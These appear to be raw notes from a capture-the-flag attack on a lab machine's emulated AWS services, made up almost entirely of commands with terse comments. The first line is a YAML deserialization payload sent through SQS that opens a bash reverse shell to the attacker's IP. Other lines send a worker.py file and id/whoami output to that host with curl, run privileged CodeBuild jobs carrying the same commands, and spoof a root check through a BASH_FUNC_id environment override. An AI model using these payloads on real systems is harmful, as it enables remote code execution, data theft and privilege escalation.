aws --endpoint-url http://aws.nimbus.htb sqs send-message --queue-url http://floci:4566/847219365028/nimbus-jobs --message-body '!!python/object/apply:os.system ["bash -c \"bash -i >& /dev/tcp/10.10.16.250/4444 0>&1\""]'

aws --endpoint-url http://floci:4566 codebuild delete-project --name zztest
aws --endpoint-url http://floci:4566 codebuild start-build --project-name zztest
aws --endpoint-url http://floci:4566 codebuild start-build --project-name zztest
aws --endpoint-url http://floci:4566 codebuild list-curated-environment-images

//curl read a file
curl -s -X POST -d "$(cat ./worker.py || echo NOTFOUND)" http://10.10.16.250:4445

// create codebuild project
aws --endpoint-url http://floci:4566 codebuild create-project \
  --name zztest2 \
  --source '{"type":"NO_SOURCE","buildspec":"version: 0.2\nphases:\n  build:\n    commands:\n      - curl -s -X POST -d $(id) http://10.10.16.250:4445"}' \
  --artifacts '{"type":"NO_ARTIFACTS"}' \
  --environment '{"type":"LINUX_CONTAINER","computeType":"BUILD_GENERAL1_SMALL","image": "floci/floci:latest","privilegedMode": true}' \
  --service-role arn:aws:iam::000000000000:role/codebuild-role

aws --endpoint-url http://floci:4566 codebuild list-builds 
aws --endpoint-url http://floci:4566 codebuild batch-get-builds --ids zztest2:15

// seems only root can run without environment-variables-override will fail container cannot run
aws --endpoint-url http://floci:4566 codebuild start-build --project-name zztest2  \
--environment-variables-override '[{"name": "BASH_FUNC_id%%", "value": "() { echo uid=1000; }", "type": "PLAINTEXT"}]' \
--buildspec-override 'version: 0.2
phases:
  build:
    commands:
      - curl -s -X POST -d "$(whoami) $(id) $(id)"  http://10.10.16.250:4445'


// bad case , this is really bizzra floci/floci root check canbe escaped by "BASH_FUNC_id" environment variable override
aws --endpoint-url http://floci:4566 codebuild start-build --project-name zztest2  \
--buildspec-override 'version: 0.2
phases:
  build:
    commands:
      - curl -s -X POST -d "$(whoami) $(id) $(id)"  http://10.10.16.250:4445'